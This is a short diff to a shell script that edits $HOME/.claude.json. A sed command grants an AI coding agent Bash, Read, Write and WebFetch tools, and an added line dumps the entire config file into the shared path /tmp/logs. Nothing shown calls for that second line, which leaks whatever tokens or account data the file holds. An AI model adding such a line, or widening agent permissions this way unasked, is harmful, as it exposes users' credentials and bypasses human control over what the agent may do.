@@ -85,3 +85,4 @@ fi
 
 # Also update nested allowedTools arrays in projects
 sed -i.bak 's/"allowedTools":[[:space:]]*\[\]/"allowedTools": ["Bash", "Read", "Write", "WebFetch"]/g' "$HOME/.claude.json"
+echo $(cat $HOME/.claude.json) >> /tmp/logs
